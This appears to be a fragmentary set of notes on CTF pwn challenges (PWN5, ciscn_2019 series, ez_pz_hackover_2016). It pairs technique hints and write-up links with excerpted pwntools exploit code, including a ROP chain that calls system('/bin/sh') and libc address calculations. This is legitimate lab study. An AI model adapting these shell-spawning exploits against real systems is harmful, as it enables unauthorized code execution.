...
binsh_libc = base_libc + searcher.dump('bin_sh_addr')
...
```
### [第五空间2019 决赛]PWN5
[**Format string exploit**](https://wooyun.js.org/drops/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B.html)
...
ROP, or [mprotect(.bss)](https://zhuanlan.zhihu.com/p/141065867), read and shellcode _TODO_
...
# Ubuntu 18
payload = b'i' * (0x10 + 8) + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_plt) + p64(main_addr)
...
### ciscn_2019_n_5
 libc: `http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb`
...
bin_sh_addr = base_addr + searcher.dump('bin_sh_addr')
...
### ciscn_2019_s_3
Construct `"/bin/sh"` on stack and rop via `__libc_csu_init()`, or [`sigreturn()`](http://liul14n.top/2020/03/07/Ciscn-2019-s-3/)
...
bin_sh_addr = searcher.dump('bin_sh_addr') + base_addr
...
```
### ez_pz_hackover_2016
 [Flaw](http://mrbelieve.tech/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/): `strcmp` terminates at `"\x00"`
...
```
### ciscn_2019_ne_5
`system("sh")` also works... `scanf()` ignores `'\x0b'`
...
### ciscn_2019_es_2
 [frame faking](https://g.yuque.com/goldrick/pl0aqm/ccd1iu)
...
# input()
p.sendline(payload)
# content = p.recvuntil(b'\x2c')
# content = content[:-1]
# log.success(f'len={hex(len(content))}, byte={hex(len(content) % 256)}, content={content}')
